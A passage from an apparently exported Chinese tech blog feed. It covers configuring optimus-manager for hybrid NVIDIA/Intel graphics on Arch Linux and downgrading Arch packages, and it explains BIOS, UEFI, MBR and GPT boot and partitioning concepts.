<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/grub</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet acpi_osi=! resume=UUID=2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot; 中加入 acpi_osi=’Windows 2009’ 或者 acpi_osi=! acpi_osi=Linux acpi_osi=’Windows 2015’ pcie_port_pm=off</span></span><br><span class="line"><span class="comment"># acpi_osi=’Windows 2009’的意思是告诉ACPI模块，我是‘Windows 7’，模拟Windows让其继续运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如：</span></span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="string">&quot;quiet acpi_osi=! acpi_osi=’Windows 2009’ resume=UUID=2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="更新grub文件，使永久有效"><a href="#更新grub文件，使永久有效" class="headerlink" title="更新grub文件，使永久有效"></a>更新grub文件，使永久有效</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装性能测试软件</span></span><br><span class="line">sudo pacman -S mesa-demos</span><br><span class="line">sudo pacman -S glmark2</span><br></pre></td></tr></table></figure>
<h1 id="测试集显性能"><a href="#测试集显性能" class="headerlink" title="测试集显性能"></a>测试集显性能</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">glxgears</span><br><span class="line">glmark2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试独显性能</span></span><br><span class="line">optirun glxgears</span><br><span class="line">optirun glmark2</span><br></pre></td></tr></table></figure>
<h2 id="NVIDIA-setting面板打不开使用以下命令"><a href="#NVIDIA-setting面板打不开使用以下命令" class="headerlink" title="NVIDIA setting面板打不开使用以下命令"></a>NVIDIA setting面板打不开使用以下命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">optirun -b none nvidia-settings -c :8</span><br></pre></td></tr></table></figure>
<h1 id="使用optimus-manager管理显卡"><a href="#使用optimus-manager管理显卡" class="headerlink" title="使用optimus-manager管理显卡"></a>使用optimus-manager管理显卡</h1><p><a href="https://github.com/Askannz/optimus-manager">optimus-manager仓库</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pacman -S optimus-manager</span><br></pre></td></tr></table></figure>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>确保 <code>/etc/X11/xorg.conf</code> 和 <code>/etc/X11/xorg.conf.d</code> 下没有其他显卡和显示相关的配置，如果有的话可以备份后删掉,原因是 <code>optimus-manager</code> 会生成显卡配置文件 <code>/etc/X11/xorg.conf.d/10-optimus-manager.conf</code>,多个显卡配置文件可能导致出错</p>
<p><strong>目录结构如下</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tree &#x2F;etc&#x2F;X11&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;X11&#x2F;</span><br><span class="line">├── xinit</span><br><span class="line">│   └── xinitrc.d</span><br><span class="line">│       ├── 40-libcanberra-gtk-module.sh</span><br><span class="line">│       └── 50-systemd-user.sh</span><br><span class="line">└── xorg.conf.d</span><br><span class="line">        └── 10-optimus-manager.conf</span><br></pre></td></tr></table></figure>
<h2 id="关闭-bumblebeed"><a href="#关闭-bumblebeed" class="headerlink" title="关闭 bumblebeed"></a>关闭 bumblebeed</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop bumblebeed</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> bumblebeed</span><br></pre></td></tr></table></figure>
<h1 id="启动optimus-manager服务"><a href="#启动optimus-manager服务" class="headerlink" title="启动optimus-manager服务"></a>启动optimus-manager服务</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> optimus-manager</span><br></pre></td></tr></table></figure>
<p><strong>重启</strong></p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 切换到nvidia</span><br><span class="line">optimus-manager --switch nvidia</span><br><span class="line"></span><br><span class="line"># 切换到Intel</span><br><span class="line">optimus-manager --switch intel</span><br><span class="line"></span><br><span class="line"># 设置开机使用intel</span><br><span class="line">optimus-manager --set-startup&#x3D;intel</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">optimus-manager [参数]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数：</span></span><br><span class="line">-h，--<span class="built_in">help</span> 			显示此帮助消息并退出</span><br><span class="line">-v，--version 		打印版本并退出</span><br><span class="line">--status 			打印optimus-manager的当前状态</span><br><span class="line">--print-mode 		打印当前桌面会话正在运行的GPU模式</span><br><span class="line">--print-next-mode 	打印下次登录会话时将使用的GPU模式</span><br><span class="line">--print-startup 	打印将在启动时使用的GPU模式</span><br><span class="line">--switch MODE 		将GPU模式设置为MODE。需要注销然后登录以应用更改。可选模式：intel，nvidia，hybrid，auto（自动检测您可能想要切换到的模式）</span><br><span class="line">--set-startup STARTUP_MODE 		将启动模式设置为STARTUP_MODE。可选模式：intel，nvidia，hybrid</span><br><span class="line">--temp-config  		PATH设置临时配置文件的路径，仅用于下次重新引导。对于测试电源开关配置而不会导致无法启动的安装很有用</span><br><span class="line">--no-confirm 		切换GPU时不要求确认并跳过所有警告</span><br><span class="line">--cleanup 			删除守护程序剩余的自动生成的配置文件</span><br></pre></td></tr></table></figure>
<p>intel模式为省电模式，nvidia模式为游戏模式</p>
<h2 id="使用图形界面配置"><a href="#使用图形界面配置" class="headerlink" title="使用图形界面配置"></a>使用图形界面配置</h2><p>通过<a href="https://github.com/Shatur95/optimus-manager-qt"><code>optimus-manager-qt</code></a>或gnome-sell扩展<a href="https://github.com/inzar98/optimus-manager-argos"><code>optimus-manager-argos</code></a>来使用图形化前端来进行切换</p>
<p>图形化配置通过生成<code>/etc/share/optimus-manager.conf</code>文件并添加内容实现配置的，如果已经有该文件会直接覆盖修改</p>
<h1 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h1><p>optimus-manager的配置文件：<code>/usr/share/optimus-manager.conf</code></p>
<p><strong>如需自定义配置，将该文件复制一份到<code>/etc/optimus-manager/</code>目录下进行修改即可</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[optimus]</span><br><span class="line"></span><br><span class="line"># 此参数定义接通Nvidia卡电源的方法</span><br><span class="line"># 可能的值：</span><br><span class="line"># -nouveau：将nouveau模块加载到Nvidia卡上</span><br><span class="line"># -bbswitch：使用bbswitch模块关闭卡的电源（需要bbswitch依赖项）</span><br><span class="line"># -acpi_call：尝试各种ACPI方法调用来打开和关闭卡的电源（需要acpi_call依赖项）</span><br><span class="line"># -none：请勿将外部模块用于电源管理。对于某些笔记本电脑型号，最好将此选项与pci_power_control结合使用（请参见下文）。设置该选项后，您还可以使用脚本nvidia-enable.sh和nvidia-disable.sh执行自定义命令以进行电源管理</span><br><span class="line"></span><br><span class="line">switching&#x3D;bbswitch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 在Intel模式下启用PCI电源管理。此选项与acpi_call和bbswitch不兼容，因此在这些情况下将被忽略</span><br><span class="line"></span><br><span class="line">pci_power_control&#x3D;yes</span><br><span class="line"></span><br><span class="line"># 从PCI总线上卸下Nvidia卡。可以防止电源开关引起的死机。如果switching &#x3D; nouveau或switching &#x3D; bbswitch则被忽略</span><br><span class="line"></span><br><span class="line">pci_remove&#x3D;no</span><br><span class="line"></span><br><span class="line"># 在重新加载nvidia模块之前，请在PCI级别上重置Nvidia卡。在重新加载nvidia模块之前，请确保卡处于新状态。可能会解决一些切换问题</span><br><span class="line"># 可能的值:</span><br><span class="line"># -no:不执行任何重置</span><br><span class="line"># -function_level:执行轻度的“功能级别”重置</span><br><span class="line"># -hot_reset:对PCI桥接器执行“热重置”。注意：此方法直接与硬件混淆，使用前请阅读optimus-manager的在线文档。另外，即使pci_remove&#x3D;no，也会执行PCI移除操作</span><br><span class="line"></span><br><span class="line">pci_reset&#x3D;no</span><br><span class="line"></span><br><span class="line"># 切换GPU时自动注销当前的桌面会话。当前，以下DE &#x2F; WM支持此功能：KDE Plasma，GNOME，XFCE，Deepin，i3，Openbox，AwesomeWM，bspwm如果禁用此选项或使用其他桌面环境，则GPU切换仅在下一个图形显示时有效会话登录</span><br><span class="line"></span><br><span class="line">auto_logout &#x3D;yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[intel]</span><br><span class="line"></span><br><span class="line"># 用于Intel GPU的驱动程序。</span><br><span class="line"># 可能的值:modesetting，intel</span><br><span class="line"># 要使用intel驱动程序，需要安装软件包“ xf86-video-intel”</span><br><span class="line"></span><br><span class="line">driver&#x3D;modesetting</span><br><span class="line"></span><br><span class="line"># 加速方法（对应于Xorg配置中的AccelMethod）。仅适用于intel驱动程序</span><br><span class="line"># 可能的值:sna,xna</span><br><span class="line"># 默认值（未指定任何选项）</span><br><span class="line">accel&#x3D;</span><br><span class="line"></span><br><span class="line"># 在Xorg配置中启用TearFree选项，仅适用于intel驱动程序</span><br><span class="line"># 可能的值:yes,no</span><br><span class="line"># 保留默认值（未指定任何选项）</span><br><span class="line">tearfree&#x3D;</span><br></pre></td></tr></table></figure>
<p>参考:</p>
<p><a href="https://blog.edward-p.xyz/2019/04/optimus-manager/">使用 optimus-manager 来管理显卡切换</a></p>
<p>Optimus-Manager的<br><a href="https://github.com/Askannz/optimus-manager/blob/master/README.md">README</a><br><a href="https://github.com/Askannz/optimus-manager/wiki">Wiki</a><br><a href="https://github.com/Askannz/optimus-manager/wiki/A-guide--to-power-management-options">电源管理选项指南</a><br><a href="https://github.com/Askannz/optimus-manager/wiki/FAQ,-common-issues,-troubleshooting">常见问题，常见问题，故障排除</a></p>
]]></content>
      <categories>
        <category>Arch</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
        <tag>显卡</tag>
      </tags>
  </entry>
  <entry>
    <title>Arch系软件降级</title>
    <url>/posts/40b8a711/</url>
    <content><![CDATA[<h1 id="滚动更新优缺点"><a href="#滚动更新优缺点" class="headerlink" title="滚动更新优缺点"></a>滚动更新优缺点</h1><p>滚动更新带来的好处是，可以让我们用上最新的软件包，但也有一定的缺点，那就是更新软件时一些动态库的引用会出现错误。</p>
<p>引用动态库出现的错误原因：</p>
<ul>
<li>软件使用了过旧的动态库文件，最新的动态库已经不再保留这些库文件。</li>
<li>软件使用了过新的动态库文件，系统软件源中最新的动态库版本还是旧版本，还不是真正的最新。</li>
</ul>
<p>出现更新后不能打开软件时，在未得到开发者解决这些 bug 前可以考虑降级到能运行的版本运行。</p>
<a id="more"></a>
<h1 id="软件降级"><a href="#软件降级" class="headerlink" title="软件降级"></a>软件降级</h1><p>安装工具 <code>downgrade</code> ，该工具使用 Arch Linux 存档库（Arch Linux Archive，简称 ala），本地缓存和ARM进行降级。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yay -S downgrade</span><br></pre></td></tr></table></figure>
<p>通过 <code>sudo downgrade &lt;软件名&gt;</code> ，检查可回滚的软件版本，直接输入选项可以回滚到指定的版本。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://linux.cn/article-9730-1.html">如何在 Arch Linux 中降级软件包</a></p>
<p><a href="https://wiki.archlinux.org/index.php/Downgrading_packages_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">Downgrading packages (简体中文)(ArchWiki)</a>)</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>BIOS、UEFI、MBR、GPT都是啥呢</title>
    <url>/posts/a3b2c5a/</url>
    <content><![CDATA[<p>装系统时难免会接触到BIOS、UEFI、MBR、GPT等概念，一下子有些混淆不清，本文就这些概念进行总结</p>
<a id="more"></a>
<h1 id="启动模式"><a href="#启动模式" class="headerlink" title="启动模式"></a>启动模式</h1><p>BIOS(<code>Basic Input/Output System</code>)是存储在BIOS芯片中的程序，现在的新式电脑用的基本都是UEFI(<code>Unified Extensible Firmware Interface</code>)（基本见于09年以后的主板），早期的过渡电脑用的都是EFI启动。EFI或UEFI的一部分是存储在EFI/UEFI BIOS芯片。EFI/UEFI也叫做EFI/UEFI  BIOS，但在实际上它们和BIOS是不一样的，所以一般把后面的“BIOS”尾巴去掉，下面就来具体谈一下BIOS、EFI和UEFI。</p>
<h2 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h2><p><strong>BIOS只认识设备，不认识分区、不认识文件</strong></p>
<font color="ff0000">BIOS启动的时候，按照CMOS设置里的顺序，挨个查存储设备的前512字节，若是以0x55 0xAA结尾，则这个磁盘可以启动，加载这512字节里的代码并执行,执行后事几乎就跟BIOS关系了，若不是，那就跳过找下一个设备。</font>



<blockquote>
<p>这512字节里存了决定启动什么系统的相应代码。这个代码是系统安装程序写进去的，目的是启动自身系统。512字节还包含了MBR分区表的信息，而BIOS并不认识分区表，所以就算是磁盘上没有分区表也没有分区，只要前512字节有0x55 0xAA的结尾，有引导代码，也是能启动系统</p>
<p>BIOS本身是汇编语言代码，是在16位实模式下调用INT  13H中断执行的，16位实模式直接能访问的内存只有1MB，就算装了4G、8G或者16G还是32G内存，到了BIOS上一律只先认前1MB。在这1MB内存中，前640K称为基本内存，后面384K内存留给开机必要硬件和各类BIOS本身使用</p>
</blockquote>
<p>BIOS用于计算机硬件自检和初始化、CMOS设置、引导操作系统启动、提供硬件I/O、硬件中断等主要功能</p>
<p><a href="#bios">BIOS启动计算机的具体过程</a></p>
<h2 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h2><h3 id="EFI"><a href="#EFI" class="headerlink" title="EFI"></a>EFI</h3><p>  <strong>EFI（Extensible Firmware  Interface，可扩展固件接口）</strong>，是用模块化、高级语言（主要是C语言）构建的一个小型化系统，和BIOS一样，<strong>主要在启动过程中完成硬件初始化</strong>，但它是直接利用加载EFI驱动的方式，识别系统硬件并完成硬件初始化，彻底摒弃读各种中断执行。EFI驱动并不是直接面向CPU的代码，而是由EFI字节码编写成，EFI字节码是专用于EFI的虚拟机器指令，需要在EFI驱动运行环境DXE下解释运行，这样EFI既可以实现通配，又提供了良好的兼容，因此<strong>与BIOS不同的是CMOS设置程序在EFI上是作为一个个EFI程序来执行的，硬件设置是硬件设置程序、而启动管理则是另一个程序，保存CMOS又是另一个程序</strong>。此外，<strong>EFI完全是32位或64位，摒弃16位实模式，在EFI中就可以实现处理器的最大寻址</strong>，因此可以在任何内存地址存放任何信息。</p>
<p>  EFI在功能上完全等同于一个轻量化的OS（操作系统），但EFI在制定时就定位到不足以成为专业OS的地位上，它只是一个硬件和操作系统间的一个接口；不提供中断访问机制，EFI必须用轮询的方式检查并解释硬件，较OS下的驱动执行效率较低；EFI只有简单的存储器管理机制，在段保护模式下只将存储器分段，所有程序都可以存取任何一段位置，不提供真实的保护服务。伴随着EFI，一种全新的GUID磁盘分区系统（GPT）被引入支持。</p>
<p>在EFI发展到1.1的时候，英特尔把EFI公之于众，后续的2.0吸引了众多公司加入，EFI也不再属于英特尔，而是属于了Unified EFI  Form的国际组织，EFI在2.0后也改称为UEFI，EFI和原来是一个意思，U则是Unified（一元化、统一）的缩写，所以UEFI的意思就是“统一的可扩展固件接口”</p>
<h3 id="UEFI-1"><a href="#UEFI-1" class="headerlink" title="UEFI"></a>UEFI</h3><p><strong>UEFI认识设备，还认识设备ROM，还认识分区表、认识文件系统以及文件</strong></p>
<p>UEFI启动的时候，经过一系列初始化，然后按照设置的顺序，找启动项。启动项分设备启动项和文件启动项两种：</p>
<ul>
<li>文件启动项，大概记录的是某磁盘的某分区的某路径下的某个文件。对于文件启动项，固件会直接加载这个EFI文件，并执行，文件不存在则失败。</li>
<li>设备启动项，大概记录的是某U盘、某硬盘等设备启动项，且UEFI标准规定了其默认的路径<code>\EFI\Boot\bootX64.efi</code>。UEFI会加载磁盘上的这个文件，文件不存在则失败。</li>
</ul>
<font color="ff0000">UEFI启动后，进入DXE（Driver eXecution Environment，驱动程序执行环境）阶段，开始加载设备驱动，然后获得设备列表。对于磁盘，UEFI会加载对应的驱动解析其中的分区表（GPT和MBR）。然后UEFI就会用内置的文件系统驱动，解析每个分区从中认识出启动文件，比如`\EFI\Boot\bootX64.efi` </font>

<p><a href="#uefi">UEFI启动计算机的具体过程</a></p>
<blockquote>
<p> UEFI标准里，在GPT分区表的基础上，规定了一个EFI系统分区（EFI System Partition，ESP），ESP要格式化成FAT32，EFI启动文件要放在“\EFI\&lt;厂商&gt;”文件夹下面</p>
<p>作为UEFI标准里，钦定的文件系统，FAT32.efi是每个主板都会带的。所有UEFI的主板都认识FAT32分区</p>
<p>BIOS只能在16位模式下运行，而UEFI可以在32位或64位模式下运行，具有比BIOS更多的可寻址地址空间</p>
<p>UEFI还包含了其他功能，它支持安全引导（SecureBoot），开启后，主板会验证即将加载的efi文件的签名，如果是不是受信任的，就会拒绝加载，以确保没有恶意软件篡改引导过程</p>
</blockquote>
<p>磁盘分区要格式化之后才能存文件，格式化成不同的文件系统，文件才能被不同的操作系统识别<br>如Win10可以选FAT32、NTFS、exFAT、ReFS等；Linux可以选ext2、ext3、ext4、FAT32等；macOS可以选FAT32、HFS+、APFS、exFAT等</p>
<p>其实每个操作系统都带有文件系统驱动才能读取文件系统中的文件<br>比如Windows带了FAT32、NTFS、exFAT、ReFS四种文件系统等驱动，Linux带了FAT32、ext等文件系统等驱动，macOS带了FAT32、HFS+、APFS、exFAT四种驱动以及NTFS只读驱动。<br>设备也是一样的。<br>原版的WinXP只带了IDE驱动，没有SATA驱动；原版Win7只带了IDE和SATA驱动，没带NVMe驱动；Win8/Win10则带了IDE/SATA和NVMe三种驱动；macOS10.12带了SATA驱动以及苹果专用NVMe磁盘的驱动；macOS10.13带了SATA和标准NVMe驱动。</p>
<p>UEFI模糊了固件和操作系统界限，设计之初就考虑到了扩展性，也是有驱动程序的。启动过程中的DXE阶段加载驱动用的</p>
<h2 id="UEFI和BIOS比较。"><a href="#UEFI和BIOS比较。" class="headerlink" title="UEFI和BIOS比较。"></a>UEFI和BIOS比较。</h2><p>二者显著的区别就是EFI是用模块化，C语言风格的参数堆栈传递方式，动态链接的形式构建的系统，较BIOS而言更易于实现，容错和纠错特性更强，缩短了系统研发的时间。<br>| BIOS                                                         | UEFI                                                         |<br>| —————————————————————————————— | —————————————————————————————— |<br>| 16位实模式下运行，只有1M的寻址空间                           | 运行于32位或64位模式,具有更多的可寻址地址空间                |<br>| BIOS利用挂载真实模式中断的方式增加硬件功能                   | 将一段类似于驱动的16位代码，放置在固定的0x000C0000至0x000DFFFF之间存储区中，运行这段代码的初始化部分，它将挂载实模式下约定的中断矢量向其他程序提供服务 |<br>| BIOS提供的服务在现实中只能提供给操作系统引导程序或MS-DOS类操作系统使用 | 具有良好的向下兼容性和被外部访问的特性                       |<br>| 不支持secure boot                                            | 支持secure boot                                              |</p>
<h1 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h1><p>直接比较，需要细细了解的可以继续看，不想细细了读完彩色部分大概知道有什么不同就行，直接跳过前两小节即可。</p>
<p><strong><font color="008000">传统MBR磁盘最多有4个主分区（或3个主分区，1个扩展分区和无限制的逻辑驱动器），MBR硬盘分区最大仅支持2T容量。</font></strong></p>
<p><strong><font color="ff0000">GPT磁盘分区样式支持最大为128个分割，一个分割最大18 EB，只受到操作系统限制（由于分区表本身需要占用一定空间，最初规划硬盘分区时，留给分区表的空间决定了最多可以有多少个分区，IA-64版Windows限制最多有128个分区，这也是EFI标准规定的分区表的最小尺寸）。</font></strong> 与MBR分区的磁盘不同，至关重要的平台操作数据位于分区，而不是位于非分区或隐藏扇区。另外，GPT分区磁盘有备份分区表来提高分区数据结构的完整性。在UEFI系统上，通常是通过ESP分区中的EFI应用程序文件引导GPT硬盘上的操作系统，而不是活动主分区上的引导程序。 </p>
<h2 id="MBR-Master-Boot-Record-主引导记录"><a href="#MBR-Master-Boot-Record-主引导记录" class="headerlink" title="MBR(Master Boot Record,主引导记录)"></a>MBR(Master Boot Record,主引导记录)</h2><p><strong>主引导记录（Master Boot Record，MBR）</strong>，又叫做主引导扇区，是计算机开机后访问硬盘时所必须要读取的首个扇区，它在硬盘上的三维地址为（柱面，磁头，扇区）＝（0，0，1）。有时将其开头的446字节内容特指为“主引导记录”（MBR），其后是4个16字节的“磁盘分区表”（DPT），以及2字节的结束标志（55AA）。因此，在使用“主引导记录”（MBR）这个术语的时候，需要根据具体情况判断其到底是指整个主引导扇区，还是主引导扇区的前446字节。 </p>
<p><strong>主引导记录</strong>最开头是第一阶段引导代码。其中的硬盘引导程序的主要作用是检查分区表是否正确并且在系统硬件完成自检以后将控制权交给硬盘上的引导程序（如GNU GRUB）。它不依赖任何操作系统，而且启动代码也是可以改变的，从而能够实现多系统引导。</p>
<p><strong>DPT(Disk Partition Table,硬盘分区表 )</strong>占据主引导扇区的64个字节（偏移01BEH—偏移01FDH），可以对四个分区的信息进行描述，其中每个分区的信息占据16个字节。</p>
<p><strong>结束标志字</strong>55，AA（偏移1FEH－偏移1FFH）最后两个字节，是检验主引导记录是否有效的标志</p>
<p>主引导扇区记录着硬盘本身的相关信息以及硬盘各个分区的大小及位置信息，是数据信息的重要入口。如果它受到破坏，硬盘上的基本数据结构信息将会丢失，需要用繁琐的方式试探性的重建数据结构信息后才可能重新访问原先的数据。主引导扇区内的信息可以通过任何一种基于某种操作系统的分区工具软件写入，但和某种操作系统没有特定的关系，即只要创建了有效的主引导记录就可以引导任意一种操作系统。</p>
<p><strong>主引导记录仅仅包含一个64个字节的硬盘分区表</strong>。由于每个分区信息需要16个字节，所以对于采用MBR型分区结构的硬盘，<strong>最多只能识别4个主要分区</strong>（Primary partition）。所以对于一个采用此种分区结构的硬盘来说，想要得到4个以上的主要分区是不可能的。从而引出了扩展分区。扩展分区也是主要分区的一种，但它与主分区的不同在于<strong>理论上可以划分为无数个逻辑分区。</strong></p>
<p>扩展分区中逻辑驱动器的引导记录是链式的。每一个逻辑分区都有一个和MBR结构类似的<strong>扩展引导记录</strong>（EBR），其分区表的第一项指向该逻辑分区本身的引导扇区，第二项指向下一个逻辑驱动器的EBR，分区表第三、第四项没有用到。 </p>
<ul>
<li><p>Windows系统默认情况下，一般都是只划分一个主分区给系统，剩余的部分全部划入扩展分区。 </p>
</li>
<li><p>在MBR分区表中最多4个主分区或者3个主分区＋1个扩展分区，也就是说扩展分区只能有一个，然后可以再细分为多个逻辑分区。</p>
</li>
<li>在Linux系统中，硬盘分区命名为sda1－sda4或者hda1－hda4（其中a表示硬盘编号可能是a、b、c等等）。在MBR硬盘中，分区号1－4是主分区（或者扩展分区），逻辑分区号只能从5开始。</li>
<li>在MBR分区表中，一个分区最大的容量为2T，且每个分区的起始柱面必须在这个硬盘的前2T内。有一个3T的硬盘，根据要求至少要划分为2个分区，且最后一个分区的起始扇区要位于硬盘的前2T空间内。如果硬盘太大则必须改用GPT。</li>
</ul>
<h2 id="GPT-GUID-Partition-Table-全局唯一标识分区表"><a href="#GPT-GUID-Partition-Table-全局唯一标识分区表" class="headerlink" title="GPT(GUID Partition Table,全局唯一标识分区表)"></a>GPT(GUID Partition Table,全局唯一标识分区表)</h2><p><strong>全局唯一标识分区表（GUID Partition Table，GPT）</strong>是一个实体硬盘的分区表的结构布局的标准。它是可扩展固件接口（UEFI）标准（被Intel用于替代个人计算机的BIOS）的一部分，被用于替代BIOS系统中的一32bits来存储逻辑块地址和大小信息的主引导记录（MBR）分区表。对于那些扇区为512字节的磁盘，MBR分区表不支持容量大于2.2TB的分区，然而，一些硬盘制造商（诸如希捷和西部数据）注意到这个局限性，并且将他们的容量较大的磁盘升级到4KB的扇区，这意味着MBR的有效容量上限提升到16 TiB。 </p>
<p>在MBR硬盘中，分区信息直接存储于主引导记录（MBR）中（主引导记录中还存储着系统的引导程序）。但在GPT硬盘中，分区表的位置信息储存在GPT头中。但出于兼容性考虑，硬盘的第一个扇区仍然用作MBR，之后才是GPT头。</p>
<p>主引导记录最开头是第一阶段引导代码。其中的硬盘引导程序的主要作用是检查分区表是否正确并且在系统硬件完成自检以后将控制权交给硬盘上的引导程序（如GNU GRUB）。它不依赖任何操作系统，而且启动代码也是可以改变的，从而能够实现多系统引导。</p>
<h3 id="传统MBR"><a href="#传统MBR" class="headerlink" title="传统MBR"></a>传统MBR</h3><p>在GPT分区表的最开头，出于兼容性考虑仍然存储了一份传统的MBR，用来防止不支持GPT的硬盘管理工具错误识别并破坏硬盘中的数据，这个MBR也叫做保护MBR。在支持从GPT启动的操作系统中，这里也用于存储第一阶段的启动代码。在这个MBR中，只有一个标识为0xEE的分区，以此来表示这块硬盘使用GPT分区表。不能识别GPT硬盘的操作系统通常会识别出一个未知类型的分区，并且拒绝对硬盘进行操作，除非用户特别要求删除这个分区。这就避免了意外删除分区的危险。另外，能够识别GPT分区表的操作系统会检查保护MBR中的分区表，如果分区类型不是0xEE或者MBR分区表中有多个项，也会拒绝对硬盘进行操作。</p>
<p>在使用MBR/GPT混合分区表的硬盘中，这部分存储了GPT分区表的一部分分区（通常是前四个分区），可以使不支持从GPT启动的操作系统从这个MBR启动，启动后只能操作MBR分区表中的分区。</p>
<h3 id="分区表头"><a href="#分区表头" class="headerlink" title="分区表头"></a>分区表头</h3><p>分区表头定义了硬盘的可用空间以及组成分区表的项的大小和数量。分区表头还记录了这块硬盘的GUID，记录了分区表头本身的位置(LBA 1)和大小以及备份分区表头和分区表的位置(硬盘的最后)和大小。还储存着它本身和分区表的CRC32校验。固件、引导程序和操作系统在启动时可以根据这个校验值来判断分区表是否出错，如果出错了，可以使用软件从硬盘最后的备份GPT中恢复整个分区表，如果备份GPT也校验错误，硬盘将不可使用。所以GPT硬盘的分区表不可以直接使用16进制编辑器修改</p>
<h3 id="分区表项"><a href="#分区表项" class="headerlink" title="分区表项"></a>分区表项</h3><p>GPT分区表使用简单而直接的方式表示分区。一个分区表项的前16字节是分区类型GUID(如，EFI系统分区的GUID类型是:<code>`C12A7328-F81F-11D2-BA4B-00A0C93EC93B</code>)。接下来的16字节是该分区唯一的GUID（这个GUID指的是该分区本身，而之前的GUID指的是该分区的类型）。再接下来是分区起始和末尾的64位LBA编号，以及分区的名字和属性。 </p>
<h3 id="操作系统支持"><a href="#操作系统支持" class="headerlink" title="操作系统支持"></a>操作系统支持</h3><ul>
<li><p>现在几乎所以类Unix操作系统如FreeBSD、Linux、MacOS等都有读写支持和启动支持</p>
</li>
<li><p>Windows：</p>
</li>
</ul>
<blockquote>
<p>1：读写支持</p>
<p>2：启动支持</p>
<p>3：启动支持(需要UEFI)</p>
<p>4：在MBR/GPT混合硬盘中优先使用MBR</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>XP</th>
<th>2003</th>
<th>vista</th>
<th>2008</th>
<th>7</th>
<th>2012</th>
<th>8</th>
<th>8.1</th>
<th>10</th>
<th>2016</th>
</tr>
</thead>
<tbody>
<tr>
<td>32位</td>
<td></td>
<td>1(SP1)</td>
<td>1/4</td>
<td>1/4</td>
<td>1/4</td>
<td>-</td>
<td>1/3/4</td>
<td>1/3/4</td>
<td>1/3/4</td>
<td>-</td>
</tr>
<tr>
<td>64位</td>
<td>1/4</td>
<td>1/2/3/4</td>
<td>1/3/4</td>
<td>1/2/3/4</td>
<td>1/3/4</td>
<td>1/3/4</td>
<td>1/3/4</td>
<td>1/3/4</td>
<td>13/4</td>
<td>1/3/4</td>
</tr>
</tbody>
</table>
</div>
<p>注意：64位2003在x64平台为<code>3</code>，在IA-64平台上为<code>2</code>；64位2008在x64平台上为<code>3</code>，在IA-64平台上为<code>2</code></p>
<h1 id="计算机启动过程"><a href="#计算机启动过程" class="headerlink" title="计算机启动过程"></a>计算机启动过程</h1><h2 id="BIOS启动计算机的过程"><a href="#BIOS启动计算机的过程" class="headerlink" title="BIOS启动计算机的过程"></a><span id="bios">BIOS启动计算机的过程</span></h2><p>  当按下电源，主板等设备开始供电，这时电压还不稳定。在早期的南北桥主板上，由主板北桥向CPU发复位信号，对CPU初始化；稳定电压后复位信号便撤掉。现在的单南桥主板，则由CPU自身调整稳定电压达到初始化的目的，当电压稳定后，CPU便在系统BIOS保留的内存地址处执行跳转BIOS起始处指令，开始执行POST自检。</p>
<p>  在POST自检中，BIOS只检查系统的必要核心硬件(CPU、640K基本内存、显卡)是否有问题，PS/2键盘控制器、系统时钟是否有错误等等。由于POST检查在显卡初始化以前，因此在这个阶段如发生错误，无法在屏幕上显示，不过主板上有个报警扬声器，如果主板的8255外围可编程接口芯片没有损坏的话，POST报警声音一定是会出来的。一般情况下，一声短“嘀”声基本代表正常启动，不同的错误则是不同的短“嘀”声和长“嘀”声组合。POST自检结束后，BIOS开始调用中断完成各种硬件初始化工作。</p>
